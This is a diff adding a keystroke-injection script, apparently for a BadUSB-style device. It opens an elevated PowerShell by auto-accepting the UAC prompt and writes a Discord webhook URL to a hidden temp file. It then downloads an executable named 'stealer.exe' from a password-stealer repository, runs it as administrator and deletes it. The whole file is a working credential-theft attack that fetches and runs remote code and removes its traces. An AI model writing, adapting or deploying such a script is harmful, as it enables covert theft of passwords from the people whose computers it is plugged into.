@@ -1,1 +1,22 @@
+layout("US");
 
+press("GUI r");
+delay(500);
+type("powershell");
+delay(100);
+press("CTRL SHIFT ENTER");
+delay(1000);
+press("LEFT");
+delay(100);
+press("ENTER");
+delay(1000);
+
+// Write webhook URL to hidden file (properly escaped)
+type("Set-Content -Path \"$env:TEMP\\webhook.txt\" -Value \"https://discord.com/api/webhooks/PUT-YOUR-WEBHOOK-HERE"\n");
+type("attrib +h \"$env:TEMP\\webhook.txt\"\n");
+
+// Download, run, and remove the stealer executable
+type("$exe=\"$env:TEMP\\stealer.exe\"; Invoke-WebRequest -Uri \"https://raw.githubusercontent.com/SawyerTheNerd/Password-Stealer-EXE-py-DISCORD-WEBHOOK/main/Stealer2.exe\" -OutFile $exe; Start-Process $exe -Verb RunAs -Wait; Remove-Item $exe\n");
+
+// close powershell
+type("exit\n");
